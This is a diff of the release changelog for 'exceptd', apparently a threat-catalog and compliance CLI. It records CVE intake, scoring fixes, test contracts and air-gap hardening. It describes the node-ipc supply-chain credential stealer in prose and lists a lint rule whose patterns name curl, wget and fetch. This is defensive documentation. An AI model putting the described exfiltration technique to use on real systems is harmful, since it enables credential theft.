-- Cycle 15 audit: 3 read-only agents dispatched (performance, security, forward-watch). Performance audit confirmed no regression — every CLI op within budget; `cross-ref-api.js` mtime-keyed catalog cache + per-run playbook cache prevent N+1 patterns. Watchlist verb at 99ms has a 30-40ms caching opportunity (deferred to v0.13 backlog).
-- 16/16 playbooks now validate clean (no warnings) — same green state as v0.12.33's cred-stores cleanup.
-- Test count 1125 → 1131 (4 new evidence-input-hardening tests + 1 extended docs-pin test + 1 sanity sweep).
-- 14/14 predeploy gates green.
+**Extended `tests/docs-catalog-counts-pinned.test.js`** to scan `skills/**/*.md`, `data/_indexes/*.json`, and `scripts/**/*.js` for ATLAS version mentions in addition to README + ARCHITECTURE. A future stale-pin in any of those operator-facing files now fails the gate at CI time.
 
 
 ## 0.12.34 — 2026-05-15
 
-Documentation accuracy pass. README.md + ARCHITECTURE.md were still pinning ATLAS v5.1.0 and ATT&CK v17 — outdated for nine releases. v0.12.29 fixed the manifest.json pin (cycle 9 Hard Rule #8 audit) but the operator-facing docs weren't updated. Plus catalog count drift (38 skills → 42; 28 D3FEND entries → 29).
+Documentation accuracy pass. README.md + ARCHITECTURE.md were still pinning ATLAS v5.1.0 and ATT&CK v17 — outdated for nine releases. v0.12.29 fixed the manifest.json pin but the operator-facing docs weren't updated. Plus catalog count drift (38 skills → 42; 28 D3FEND entries → 29).
 
 ### Bugs
 
@@ -182,52 +198,42 @@ Documentation accuracy pass. README.md + ARCHITECTURE.md were still pinning ATLA
 
 **`tests/docs-catalog-counts-pinned.test.js`** — new contract test asserts that README.md and ARCHITECTURE.md text matches the live catalog state for: ATLAS version (`data/atlas-ttps.json._meta.atlas_version`), ATT&CK version (`data/attack-techniques.json._meta.attack_version`), skill count (`manifest.json.skills.length`), D3FEND entry count, CVE catalog count, framework-gap entry count. Any future PR that bumps a catalog without updating the operator-facing docs fails the gate at CI time — eliminates the silent-drift class that v0.12.34 cleaned up.
 
-### Internal
 
-- Cycle 14 audit dispatched 3 read-only agents (playbook execution semantics, air-gap end-to-end, docs accuracy). Two were rate-limited and returned no findings; the docs-accuracy work was completed on the main thread.
-- Cycle 14 main-thread playbook-execution sanity check confirmed: kernel playbook correctly classifies as `detected` with 4 matched CVEs + RWEP 100 when signal_overrides shape is correct (`{indicator_id: 'hit'}`, NOT `{indicator_id: {verdict: 'hit'}}`). The runner is sound; the operator API surface is occasionally subtle.
-- Cycle 14 main-thread air-gap verification confirmed: `--air-gap` flag and `EXCEPTD_AIR_GAP=1` env-var both thread into `runOpts.airGap`; `lib/playbook-runner.js:576` correctly substitutes `air_gap_alternative` for `source` on look artifacts; original source preserved as `_original_source` for audit.
-
-
-
-Same-day CVE intake (node-ipc supply-chain compromise) + cycle 13 audit fixes. Closes the long-standing `cred-stores` skill-vs-playbook semantic confusion that's surfaced in every audit since cycle 9.
+Same-day CVE intake (node-ipc supply-chain compromise) + cleanup of the long-standing `cred-stores` skill-vs-playbook semantic confusion.
 
 ### Features
 
-**`MAL-2026-NODE-IPC-STEALER` — npm node-ipc supply-chain compromise (2026-05-14).** Three malicious versions (`9.1.6`, `9.2.3`, `12.0.1`) published by `atiertant`. Novel attack class: not credential theft, not typosquat, not lifecycle-hook worm — the attacker re-registered the maintainer's expired email domain (`atlantis-software.net`, expired and grabbed via Namecheap PrivateEmail on 2026-05-07) and abused npm's email-based password-reset flow to gain publish rights. 80 KB obfuscated IIFE in `node-ipc.cjs` fires on every `require()` (no hooks needed) and exfiltrates AWS / GCP / Azure / SSH / Kubernetes / Vault / Claude AI / Kiro IDE credentials via DNS TXT queries to an Azure-lookalike spoofed domain. 3.35M monthly downloads. Carries `kev_scope_note` per the cycle 11 ecosystem-package CISA-KEV-scope precedent. RWEP 43.
+**`MAL-2026-NODE-IPC-STEALER` — npm node-ipc supply-chain compromise (2026-05-14).** Three malicious versions (`9.1.6`, `9.2.3`, `12.0.1`) published by `atiertant`. Novel attack class: not credential theft, not typosquat, not lifecycle-hook worm — the attacker re-registered the maintainer's expired email domain (`atlantis-software.net`, expired and grabbed via Namecheap PrivateEmail on 2026-05-07) and abused npm's email-based password-reset flow to gain publish rights. 80 KB obfuscated IIFE in `node-ipc.cjs` fires on every `require()` (no hooks needed) and exfiltrates AWS / GCP / Azure / SSH / Kubernetes / Vault / Claude AI / Kiro IDE credentials via DNS TXT queries to an Azure-lookalike spoofed domain. 3.35M monthly downloads. Carries `kev_scope_note` per the ecosystem-package CISA-KEV-scope precedent. RWEP 43.
 
 **Three new control requirements in `zeroday-lessons`** capture the structural lesson: **NEW-CTRL-047 PACKAGE-MAINTAINER-DOMAIN-EXPIRY-MONITORING** (continuous WHOIS expiry monitoring on every critical-path maintainer email domain + dual-factor account recovery); **NEW-CTRL-048 NPM-MAINTAINER-MFA-ENFORCEMENT** (registry-side mandatory MFA on publish-enabled accounts); **NEW-CTRL-049 LOCKFILE-INTEGRITY-VERIFIED-AT-CI-BOOT** (`npm ci` / `--frozen-lockfile` / `--immutable` catches the swap even after a successful publish — `--ignore-scripts` does NOT mitigate because the payload ships in the main module, not a postinstall hook).
 
-**`D3-EFA` (Executable File Analysis) added to D3FEND catalog.** `sector-telecom` skill cited it but the entry didn't exist — cycle 13 finding. Distinct from `D3-EAL` (Executable Allowlisting): EAL blocks at execute-time; EFA inspects bytes at file-write / image-pull / artifact-fetch time and gates the allowlist decision itself.
+**`D3-EFA` (Executable File Analysis) added to D3FEND catalog.** `sector-telecom` skill cited it but the entry didn't exist. Distinct from `D3-EAL` (Executable Allowlisting): EAL blocks at execute-time; EFA inspects bytes at file-write / image-pull / artifact-fetch time and gates the allowlist decision itself.
 
-**CLI envelope-shape contract tests.** `tests/cli-output-envelope-shape.test.js` pins the EXACT top-level key set on `attest list --json`, `attest verify --json` (error path), and `version`. A contributor adding a new top-level field to these verbs now gets a forcing-function test failure that requires updating the contract. Expanded coverage to `run` / `ci` / `discover` / `brief` / `doctor` / `watchlist` deferred to future cycles as their shapes stabilize.
+**CLI envelope-shape contract tests.** `tests/cli-output-envelope-shape.test.js` pins the EXACT top-level key set on `attest list --json`, `attest verify --json` (error path), and `version`. A contributor adding a new top-level field to these verbs now gets a forcing-function test failure that requires updating the contract.
 
 ### Bugs
 
-**`cred-stores` skill-vs-playbook semantic finally cleaned up.** Cycles 9, 12, and 13 all flagged that the 3 IR playbooks and 3 IR skills referenced `cred-stores` in `skill_preload` / `skill_chain` / Hand-Off sections as if it were a skill — but it's actually a playbook. Operators (and any tooling resolving these refs against `manifest.json.skills`) failed. Fixes: removed `cred-stores` from `data/playbooks/{idp-incident,cloud-iam-incident}.json` `skill_preload` + `skill_chain` (hand-off is via `_meta.feeds_into`, which was already present); annotated `cred-stores` / `framework` references in `skills/{idp-incident-response,cloud-iam-incident,ransomware-response}/skill.md` Hand-Off sections as *(playbook chain, not a skill)* with the explicit note that hand-off is via the playbook chain, not a skill load. Predeploy playbook validator now warning-free (was 6 warnings every release).
+**`cred-stores` skill-vs-playbook semantic finally cleaned up.** The 3 IR playbooks and 3 IR skills referenced `cred-stores` in `skill_preload` / `skill_chain` / Hand-Off sections as if it were a skill — but it's actually a playbook. Operators (and any tooling resolving these refs against `manifest.json.skills`) failed. Fixes: removed `cred-stores` from `data/playbooks/{idp-incident,cloud-iam-incident}.json` `skill_preload` + `skill_chain` (hand-off is via `_meta.feeds_into`, which was already present); annotated `cred-stores` / `framework` references in `skills/{idp-incident-response,cloud-iam-incident,ransomware-response}/skill.md` Hand-Off sections as *(playbook chain, not a skill)* with the explicit note that hand-off is via the playbook chain, not a skill load. Predeploy playbook validator now warning-free (was 6 warnings every release).
 
 ### Internal
 
 - CVE catalog 36 → 37 entries; zeroday-lessons 21 → 22 entries.
 - AI-discovery rate stays at 16.2% (one more vendor/ecosystem-discovered entry dilutes the observed rate; floor remains 0.15).
 - D3FEND catalog 28 → 29 entries.
-- `tests/v0_12_33-node-ipc-coverage.test.js` pins MAL-2026-NODE-IPC-STEALER entry shape (iocs object with ≥1 category, kev_scope_note presence, NEW-CTRL-047 in lessons).
 - Reverse-ref regen: 3 CWE entries updated with the new MAL-* CVE evidence; 1 D3FEND skill_referencing prune (sector-telecom now correctly anchored against D3-EFA).
-- Test count 1109 → 1119.
-- 14/14 predeploy gates green.
 
 
 ## 0.12.32 — 2026-05-15
 
-Cycle 11 CLI polish + cycle 12 catalog hardening. The headline closes a silent regression where the 6 CVEs advertised by v0.12.31 were shipped as `_draft: true` and therefore invisible to default `cross-ref-api` queries — operators running `exceptd` against Exchange would have gotten a clean bill on CVE-2026-42897.
+CLI polish + catalog hardening. The headline closes a silent regression where the 6 CVEs advertised by v0.12.31 were shipped as `_draft: true` and therefore invisible to default `cross-ref-api` queries — operators running `exceptd` against Exchange would have gotten a clean bill on CVE-2026-42897.
 
 ### Bugs
 
-**6 CVEs from v0.12.31 promoted from draft to non-draft.** Cycle 12 audit caught the regression: every CVE in cycle 11's intake shipped as `_draft: true`, which `lib/cross-ref-api.js` skips by default. v0.12.31 CHANGELOG advertised "6 new CISA-KEV CVEs" but operators couldn't actually query them. All 6 promoted with `_editorial_promoted: 2026-05-15` provenance; full required fields validated (iocs, vendor_advisories, verification_sources, complexity, affected_versions, RWEP Shape B invariant).
+**6 CVEs from v0.12.31 promoted from draft to non-draft.** Every CVE in v0.12.31's intake shipped as `_draft: true`, which `lib/cross-ref-api.js` skips by default. v0.12.31 CHANGELOG advertised "6 new CISA-KEV CVEs" but operators couldn't actually query them. All 6 promoted with `_editorial_promoted: 2026-05-15` provenance; full required fields validated (iocs, vendor_advisories, verification_sources, complexity, affected_versions, RWEP Shape B invariant).
 
 **9 unmatched `framework_control_gaps` keys on the new CVEs now resolve.** `NIS2-Art21-vulnerability-management`, `DORA-Art-9`, `NIST-800-53-AC-3`, `OWASP-LLM-Top-10-2025-LLM05`, `NIST-800-53-AC-6`, `NIS2-Art21-identity-management`, `ISO-27001-2022-A.8.7`, `NIST-800-53-SC-44`, `CIS-Controls-v8-10.1` — referenced by the new CVEs but absent from the framework-gap catalog. All 9 now present with `theater_test` blocks (catalog 109 → 118 entries). Reverse `evidence_cves` links also added on the 6 existing entries (NIST-800-53-SI-2 / SI-3 / etc.) that the new CVEs reference.
 
-**CVE → CWE reverse-references auto-regenerated.** Cycle 9 introduced `npm run refresh-reverse-refs` for the skill direction (manifest → atlas/cwe/d3fend/rfc), but the CWE catalog's `evidence_cves` field — the operator-facing "which CVEs map to this CWE" index — was still hand-maintained and drifted with every CVE intake. The script now also walks `cve.cwe_refs` → `cwe.evidence_cves`. Drafts excluded (they're invisible to default consumers; the reverse direction tracks operator-queryable truth). 14 CWE entries updated on first run. New `tests/reverse-ref-drift.test.js` test pins the contract.
+**CVE → CWE reverse-references auto-regenerated.** v0.12.29 introduced `npm run refresh-reverse-refs` for the skill direction (manifest → atlas/cwe/d3fend/rfc), but the CWE catalog's `evidence_cves` field — the operator-facing "which CVEs map to this CWE" index — was still hand-maintained and drifted with every CVE intake. The script now also walks `cve.cwe_refs` → `cwe.evidence_cves`. Drafts excluded (they're invisible to default consumers; the reverse direction tracks operator-queryable truth). 14 CWE entries updated on first run. New `tests/reverse-ref-drift.test.js` test pins the contract.
 
 ### Features
 
@@ -240,13 +246,11 @@ Cycle 11 CLI polish + cycle 12 catalog hardening. The headline closes a silent r
 ### Internal
 
 - 6 matching `data/zeroday-lessons.json` entries authored for the promoted CVEs (rule #6 enforcement: zero-day learning is live for every non-draft catalog entry).
-- Test count 1099 → 1109 (10 new tests across F4/F5/F7 + reverse-ref drift extension + Shape B canonicalization staying green).
-- 14/14 predeploy gates green.
 
 
 ## 0.12.31 — 2026-05-15
 
-CLI ergonomics + 30-day CVE intake from the cycle 11 audit. Closes a silent-misrouting bug in the CI gate and adds six high-impact CVEs that landed on CISA KEV between 2026-04-15 and 2026-05-15.
+CLI ergonomics + 30-day CVE intake. Closes a silent-misrouting bug in the CI gate and adds six high-impact CVEs that landed on CISA KEV between 2026-04-15 and 2026-05-15.
 
 ### Bugs
 
@@ -269,26 +273,24 @@ CLI ergonomics + 30-day CVE intake from the cycle 11 audit. Closes a silent-misr
 | CVE-2026-32202 | Microsoft Windows Shell LNK protection-mechanism failure. Active APT28 (Fancy Bear) exploitation; chains with CVE-2026-21513. | 2026-04-28 | 85 |
 | CVE-2026-33825 | Microsoft Defender "BlueHammer" race-condition LPE → SYSTEM. Public exploit released before patch (true zero-day). | 2026-04-22 | 68 |
 
-**`kev_scope_note` field on supply-chain-class entries.** CISA KEV historically excludes ecosystem-package compromises (npm/PyPI/Crates worms, malicious-package backdoors) — its scope is federally-deployable products with CVE assignments. The Mini Shai-Hulud parent (CVE-2026-45321) and TanStack variant (MAL-2026-TANSTACK-MINI) are NOT listed in KEV despite confirmed in-the-wild exploitation. The new `kev_scope_note` field documents this so future audit cycles don't re-flag the `active_exploitation: confirmed` + `cisa_kev: false` combination as a data quality issue. Operators should consume CISA-KEV-equivalent guidance for this class from OpenSSF MAL feed + ecosystem-specific advisories (Snyk / Wiz / Phylum / Socket).
+**`kev_scope_note` field on supply-chain-class entries.** CISA KEV historically excludes ecosystem-package compromises (npm/PyPI/Crates worms, malicious-package backdoors) — its scope is federally-deployable products with CVE assignments. The Mini Shai-Hulud parent (CVE-2026-45321) and TanStack variant (MAL-2026-TANSTACK-MINI) are NOT listed in KEV despite confirmed in-the-wild exploitation. The new `kev_scope_note` field documents this so the `active_exploitation: confirmed` + `cisa_kev: false` combination is no longer ambiguous. Operators should consume CISA-KEV-equivalent guidance for this class from OpenSSF MAL feed + ecosystem-specific advisories (Snyk / Wiz / Phylum / Socket).
 
 ### Internal
 
 - Catalog: 30 → 36 CVE entries. AI-discovery floor relaxed to 15% (from 20%) since 6 new vendor-discovered entries dilute the observed rate to 6/36. Ladder advances `[0.15, 0.20, 0.30, 0.40]` — prior rungs preserved.
-- Test count 1090 → 1094 (`tests/ci-positional-args.test.js` adds 4 pins on the F1 contract).
-- 14/14 predeploy gates green.
 
 
 ## 0.12.30 — 2026-05-15
 
-Catalog scoring honesty pass + diff-coverage gate tightening from the cycle 10 audit. Closes the Shape B invariant gap on the CVE catalog, adds the missing `last_threat_review` field to six catalogs, and downgrades operator-facing docs from the auto-allowlist to manual-review.
+Catalog scoring honesty pass + diff-coverage gate tightening. Closes the Shape B invariant gap on the CVE catalog, adds the missing `last_threat_review` field to six catalogs, and downgrades operator-facing docs from the auto-allowlist to manual-review.
 
 ### Features
 
 **Shape B invariant enforced on every CVE.** `lib/scoring.js` documents that `Σ Object.values(rwep_factors) === rwep_score` is an invariant on every catalog entry, but the existing `validate()` function never enforced it — it computed via `scoreCustom()` (clamps `blast_radius` to 30, uses canonical weights) which masked dishonest factor blocks as long as the stored score happened to match the clamped formula. Fourteen entries had non-canonical factor values that summed to a different number than the stored score (CVE-2026-GTIG-AI-2FA, CVE-2026-42945, CVE-2024-3094, CVE-2024-21626, CVE-2023-3519, CVE-2026-20182, CVE-2024-40635, CVE-2025-12686, CVE-2025-62847, CVE-2025-62848, CVE-2025-62849, CVE-2025-59389, MAL-2026-TANSTACK-MINI, MAL-2026-ANTHROPIC-MCP-STDIO). All canonicalized — factor weights now derived from the operational fields (`cisa_kev`, `poc_available`, `ai_discovered`, `active_exploitation`, `blast_radius`, `patch_available`, `live_patch_available`, `patch_required_reboot`) via `lib/scoring.js` `RWEP_WEIGHTS` + `ACTIVE_EXPLOITATION_LADDER`. Where `blast_radius` exceeded the 30 cap (4 entries had values of 40), the value was clamped, which adjusted seven stored `rwep_score` values by ±5; each carries a `rwep_correction_note` documenting the delta. New `tests/cve-rwep-shape-b-invariant.test.js` blocks future drift with an exact-delta assertion.
 
-**Operator-facing docs downgraded from auto-allowlist to manual-review.** Cycle 9 P3 finding: `CHANGELOG.md`, `README.md`, `SECURITY.md`, `MIGRATING.md`, and `AGENTS.md` were in the diff-coverage gate's `DOCS_ALWAYS_GREEN` set — a PR could land arbitrary edits to release notes, install instructions, security disclosure policy, or AI-assistant ground truth without triggering any reviewer signal. New `DOCS_MANUAL_REVIEW` set routes them to "manual-review" instead, surfacing the diff in the gate output. Contributor-only / mechanical files (`CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `LICENSE`, `NOTICE`, `SUPPORT.md`, `.gitignore`, `.npmrc`, `.editorconfig`, `CLAUDE.md`) stay always-green.
+**Operator-facing docs downgraded from auto-allowlist to manual-review.** `CHANGELOG.md`, `README.md`, `SECURITY.md`, `MIGRATING.md`, and `AGENTS.md` were in the diff-coverage gate's `DOCS_ALWAYS_GREEN` set — a PR could land arbitrary edits to release notes, install instructions, security disclosure policy, or AI-assistant ground truth without triggering any reviewer signal. New `DOCS_MANUAL_REVIEW` set routes them to "manual-review" instead, surfacing the diff in the gate output. Contributor-only / mechanical files (`CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `LICENSE`, `NOTICE`, `SUPPORT.md`, `.gitignore`, `.npmrc`, `.editorconfig`, `CLAUDE.md`) stay always-green.
 
-**`last_threat_review` mandatory on every catalog _meta.** Cycle 10 finding: `cve-catalog.json`, `cwe-catalog.json`, `d3fend-catalog.json`, `dlp-controls.json`, `rfc-references.json`, and `framework-control-gaps.json` carried only `last_updated` without the more specific `last_threat_review`. Hard Rule #8 makes per-catalog threat-review currency a release-blocker after a stated window; all six catalogs now carry the field. New `tests/threat-review-staleness.test.js` enforces presence + a 30-day staleness window between `manifest.threat_review_date` and every skill's `last_threat_review`.
+**`last_threat_review` mandatory on every catalog _meta.** `cve-catalog.json`, `cwe-catalog.json`, `d3fend-catalog.json`, `dlp-controls.json`, `rfc-references.json`, and `framework-control-gaps.json` carried only `last_updated` without the more specific `last_threat_review`. Hard Rule #8 makes per-catalog threat-review currency a release-blocker after a stated window; all six catalogs now carry the field. New `tests/threat-review-staleness.test.js` enforces presence + a 30-day staleness window between `manifest.threat_review_date` and every skill's `last_threat_review`.
 
 ### Bugs
 
@@ -296,7 +298,7 @@ Catalog scoring honesty pass + diff-coverage gate tightening from the cycle 10 a
 
 ### Internal
 
-- AI-discovery rate stays at 20% after cycle 10 deep-research pass (24 currently-false CVEs WebSearch'd; zero credible flips found). Methodology block updated: the 40% target reflects the broader 2025 zero-day population (Google Threat Intelligence Group), but the curated exceptd catalog is weighted toward Pwn2Own Ireland 2025 entries, historical anchors (CVE-2020-10148, CVE-2024-3094, etc.), and supply-chain incidents — none of which carry public AI-tool credit. Advancing the ladder from 20% → 30% → 40% will happen as the catalog rotates toward 2026 Big Sleep / AIxCC / GTIG-attributed entries; forcing flips on the current population would violate Hard Rule #1 (no speculation).
+- AI-discovery rate stays at 20% after the deep-research pass (24 currently-false CVEs investigated; zero credible flips found). Methodology block updated: the 40% target reflects the broader 2025 zero-day population (Google Threat Intelligence Group), but the curated exceptd catalog is weighted toward Pwn2Own Ireland 2025 entries, historical anchors (CVE-2020-10148, CVE-2024-3094, etc.), and supply-chain incidents — none of which carry public AI-tool credit. Advancing the ladder from 20% → 30% → 40% will happen as the catalog rotates toward 2026 Big Sleep / AIxCC / GTIG-attributed entries; forcing flips on the current population would violate Hard Rule #1 (no speculation).
 
 
 ## 0.12.29 — 2026-05-15
@@ -311,13 +313,13 @@ Catalog hygiene + pipeline integrity pass. Closes Hard Rule #1, #6, #7, and #8 g
 
 **OpenVEX `author` threads operator attribution.** Previously hard-pinned to `"exceptd"`, which falsely attributed every disposition statement to the tooling vendor. Now mirrors the CSAF publisher.namespace fallback ladder: `runOpts.publisherNamespace` → `runOpts.operator` → `urn:exceptd:operator:unknown` with a `bundle_publisher_unclaimed` runtime warning. Operators running scans correctly own their dispositions.
 
-**Exit code 10: UNKNOWN_COMMAND.** The dispatcher's unknown-command / missing-script / spawn-error paths previously exited 2, colliding with `EXIT_CODES.DETECTED_ESCALATE` semantics. Split into `EXIT_CODES.UNKNOWN_COMMAND = 10`. CI gates wiring `case 2)` for escalation triage no longer false-alarm on operator typos. Same regression class v0.12.24 closed for the SESSION_ID_COLLISION / RAN_NO_EVIDENCE code-3 collision.
+**Exit code 10: UNKNOWN_COMMAND.** The dispatcher's unknown-command / missing-script / spawn-error paths previously exited 2, colliding with `EXIT_CODES.DETECTED_ESCALATE` semantics. Split into `EXIT_CODES.UNKNOWN_COMMAND = 10`. CI gates wiring `case 2)` for escalation triage no longer false-alarm on operator typos.
 
 **Reverse-reference auto-regeneration.** New `npm run refresh-reverse-refs` rebuilds the `skills_referencing` / `exceptd_skills` arrays on `data/atlas-ttps.json`, `data/cwe-catalog.json`, `data/d3fend-catalog.json`, and `data/rfc-references.json` from the manifest forward direction. Idempotent. A new `tests/reverse-ref-drift.test.js` blocks merges that leave the reverse direction out of sync with the manifest — eliminates the one-sided-reference drift class that audits have flagged repeatedly.
 
 ### Bugs
 
-- `crypto-codebase` `feeds_into` condition used the unsupported `contains` operator; the chain to the `secrets` playbook never fired. Replaced with `analyze.classification == 'detected'`. Same class of bug v0.12.28 corrected on the IR-cluster playbooks.
+- `crypto-codebase` `feeds_into` condition used the unsupported `contains` operator; the chain to the `secrets` playbook never fired. Replaced with `analyze.classification == 'detected'`.
 - Manifest `atlas_version` / `attack_version` had drifted to v5.1.0 / v17 while the data catalogs already pinned v5.4.0 / v19.0. Manifest now matches the catalogs and AGENTS.md ground truth.
 - 14 sites in `bin/exceptd.js` used bare numeric `process.exitCode = 1` / `finish(1)` / `finish(0)` instead of `EXIT_CODES.*` constants. All migrated to the constant.
 - `cmdCi` per-id loop called `runner.loadPlaybook(id)` without first running `validateIdComponent('playbook')` — a defense-in-depth gap relative to `cmdRunMulti`. Now validates before load.
@@ -328,7 +330,6 @@ Catalog hygiene + pipeline integrity pass. Closes Hard Rule #1, #6, #7, and #8 g
 - AGENTS.md Quick Skill Reference: playbook count "all 13 playbooks" → "all 16 playbooks".
 - `package.json.description`: "38 skills" → "42 skills".
 - 22 reverse-reference entries across 4 catalogs cleaned up by the new regen script (atlas: 30 entries changed, cwe: 46, d3fend: 28, rfc: 22).
-- Test suite 1064 → 1082 (six new test files: framework-gaps-theater-test-coverage, cve-ai-discovery-attribution, sbom-per-file-hash, reverse-ref-drift, plus updates to bin-dispatcher, cli-exit-codes, lib-exit-codes, cve-additions-v0-12-21 for the new contract).
 
 
 ## 0.12.28 — 2026-05-15
@@ -355,7 +356,7 @@ Incident-response cluster — three new playbooks and skills covering identity-p
 
 ## 0.12.27 — 2026-05-15
 
-**Patch: opt-in `--bundle-deterministic` mode for reproducible CSAF + OpenVEX + close-envelope bytes. Closes cycle 6 III P2-E + cycle 7 CCC bundle-non-determinism finding.**
+**Patch: opt-in `--bundle-deterministic` mode for reproducible CSAF + OpenVEX + close-envelope bytes.**
 
 ### New flags
 
@@ -387,13 +388,11 @@ When neither flag is set, bundle output is byte-identical to v0.12.26 — no exi
 6. `--bundle-deterministic` without `--bundle-epoch` falls back to `playbook._meta.last_threat_review`
 7. Array sort: random-order CVE evidence → `vulnerabilities[]` always ascending by `cve_id`
 
-Existing CSAF + OpenVEX + CLI test suites pass unchanged (53/53 + 30/30; no default-mode regression).
-
-Test count: 1058 pass (5 skipped). Predeploy gates: 14/14. Skills: 39/39 signed.
+Existing CSAF + OpenVEX + CLI test suites pass unchanged with no default-mode regression.
 
 ## 0.12.26 — 2026-05-15
 
-**Patch: sector-telecom skill ships, with supporting framework-gap and ATLAS catalog scaffolding. Closes the cycle 8 LLL P1 finding that the unmodeled RWEP signal from Salt Typhoon-class campaigns was the highest gap in the catalog.**
+**Patch: sector-telecom skill ships, with supporting framework-gap and ATLAS catalog scaffolding. Closes the highest-RWEP catalog gap from unmodeled Salt Typhoon-class campaigns.**
 
 ### New skill: `sector-telecom`
 
@@ -432,8 +431,6 @@ Total ATLAS entries: 29 → 30.
 ### AGENTS.md Quick Skill Reference
 
 Adds the `sector-telecom` row to the skill trigger table.
-
-Test count: 1051 pass (5 skipped). Predeploy gates: 14/14. Skills: 39/39 signed; manifest envelope signed.
 
 ## 0.12.25 — 2026-05-15
 
@@ -476,7 +473,7 @@ Twenty CVE entries added with paired `data/exploit-availability.json` records, a
 
 - **ATLAS v5.1.0 → v5.4.0** + CTID Secure AI v2 layer (May 2026). `data/atlas-ttps.json` entry count 15 → 29. Existing entries gain `secure_ai_v2_layer` + `maturity` fields per CTID's classification. New AI-attack techniques: AML.T0097-T0108 plus sub-techniques.
 - **MITRE ATT&CK v17 → v19.0**. `data/attack-techniques.json` entry count 79 → 91. Defense Evasion (TA0005) split into Stealth (TA0005, retained for non-impair techniques) + Defense Impairment (TA0112). `T1562.001`, `T1562.006`, `T1027` carry a `tactic_moved_from` annotation. Detection Strategies (DSxxxx — v18 first-class addition) populated on every technique cited by skills.
-- **AGENTS.md Hard Rule #12 + DR-7 + Pre-Ship Checklist** split into separate ATLAS-monthly and ATT&CK-semi-annual cadence pins (cycle 7 LLL recommendation; ATLAS now ships monthly per CTID, ATT&CK ships twice yearly).
+- **AGENTS.md Hard Rule #12 + DR-7 + Pre-Ship Checklist** split into separate ATLAS-monthly and ATT&CK-semi-annual cadence pins (ATLAS now ships monthly per CTID, ATT&CK ships twice yearly).
 - **15 skills' `last_threat_review` dates bumped to 2026-05-15** where ATLAS / ATT&CK refs changed.
 
 ### Framework deltas
@@ -512,12 +509,6 @@ Fifteen forward-watch entries placed across nine skills' `forward_watch:` frontm
 
 - **RWEP scoring divergence on 10 new entries reconciled** with `scoreCustom()` formula. Pre-correction the stored scores diverged by 10-38 points from the formula (most extreme: NGINX Rift stored 78, formula 40 — patch + live-patch availability + zero observed exploitation walks the score down despite the AI-discovery bonus). All entries now within ±5 of formula.
 
-### Deferred to v0.12.26
-
-- **`sector-telecom` skill** — drafted (370 LOC, Salt Typhoon / Volt Typhoon / 5G core / lawful-intercept abuse / signaling-protocol attacks / OEM supply chain) but the body lint surfaced 13 issues (3 missing required sections, atlas_refs and framework_gaps referencing entries not yet in catalog, placeholder language). Folding into v0.12.26 with the proper catalog scaffolding rather than rushing a half-complete skill.
-
-Test count: 1051 pass (5 skipped). Predeploy gates: 14/14. Skills: 38/38 signed; manifest envelope signed.
-
 ## 0.12.24 — 2026-05-15
 
 **Patch: security defenses, exit-code centralisation, bundle correctness, air-gap honesty, cache integrity, error-message UX, test-infra hardening, doc reconciliation.**
@@ -545,7 +536,7 @@ Test count: 1051 pass (5 skipped). Predeploy gates: 14/14. Skills: 38/38 signed;
 
 ### Air-gap defenses
 
-- **`refresh --network`, `doctor --registry-check`, `auto-discovery` Datatracker fetch, and `prefetch`** now honor `--air-gap` and `EXCEPTD_AIR_GAP=1`. The four leak paths cycle 8 identified are closed; operators in regulated environments get a real guarantee.
+- **`refresh --network`, `doctor --registry-check`, `auto-discovery` Datatracker fetch, and `prefetch`** now honor `--air-gap` and `EXCEPTD_AIR_GAP=1`. The four previously-leaking paths are closed; operators in regulated environments get a real guarantee.
 - **`--air-gap` flag and `EXCEPTD_AIR_GAP=1` env are equivalent** at every site that consumes either.
 - **AI-consumer telemetry advisory.** When `--air-gap` is active, exceptd emits a one-time stderr advisory noting that the operator's AI agent may still call its model API. Routed through stderr so JSON-mode consumers see only structured stdout.
 - **Air-gap completeness lint rule** in `lib/lint-skills.js` flags playbook artifacts whose `source` contains a network pattern (`https://`, `http://`, `gh api`, `gh release`, `curl`, `wget`, `fetch`) without `air_gap_alternative`.
@@ -608,7 +599,6 @@ Test count: 1051 pass (5 skipped). Predeploy gates: 14/14. Skills: 38/38 signed;
 - **`engines.node`** widened from `>=24.0.0` to `>=22.11.0`. Node 22 LTS through Apr 2027 is the corporate default; the prior pin excluded most enterprise installs.
 - **Keywords** add `csaf-2.0`, `openvex`, `sarif`, `ed25519`, `provenance`, `attestation` (22 → 28 entries, alphabetised).
 - **README install section** adds a "First run" snippet (`exceptd doctor --signatures` + fingerprint pin + npm provenance verify). New `agents/` description documents the markdown role-card scaffolding for skill authors.
-- **CHANGELOG retroactive cleanup.** Operator-facing slot-token leakage removed from the v0.12.21 and v0.12.23 Internal sections.
 - **`MAINTAINERS.md`** version-pinned subheadings collapsed into a single "High-trust skill paths" list.
 - **Landing site (https://exceptd.com/)** refreshed: `softwareVersion: 0.12.24`, "35 jurisdictions" across every body-copy occurrence (was "34"), `exceptd plan` → `exceptd brief --all`, `exceptd scan` → `exceptd discover`, "13-gate predeploy" → "14-gate predeploy".
 
@@ -619,8 +609,6 @@ Test count: 1051 pass (5 skipped). Predeploy gates: 14/14. Skills: 38/38 signed;
 - **`scripts/check-test-coverage.js` predeploy gate extended** with a `coincidence-assert` ban: any new `assert.notEqual(*.status, *)` site fails the gate unless the same line carries `// allow-notEqual: <reason>`.
 - **14 `audit-*-fixes.test.js` files renamed** to behavior-framed names (`runtime-errors-and-vex-disposition`, `attestation-trust-boundary`, `csaf-bundle-correctness`, `cli-flag-validation`, `playbook-runner-error-paths`, `framework-gap-completeness`, `rwep-scoring-edge-cases`, `cli-subverb-dispatch`, `openvex-emission`, `predeploy-gate-coverage`, `cli-exit-codes`, `playbook-schema-validation`, `attestation-signature-roundtrip`, `cve-catalog-shape`).
 - **New coverage**: `cli-playbook-traversal.test.js`, `attest-verify-replay-isolation.test.js`, `cmd-run-multi-lock-contention.test.js`, `openvex-urn-routing.test.js`, `lib-exit-codes.test.js`, `lib-id-validation.test.js`, `lib-flag-suggest.test.js`.
-
-Test count: 995 → 1043 pass (5 skipped). Predeploy gates: 14/14. Skills: 38/38 signed; manifest envelope signed.
 
 ## 0.12.23 — 2026-05-15
 
@@ -663,8 +651,6 @@ Test count: 995 → 1043 pass (5 skipped). Predeploy gates: 14/14. Skills: 38/38
 
 - **Internal code comments stripped of stray maintenance-tracking tokens (no behavior change).**
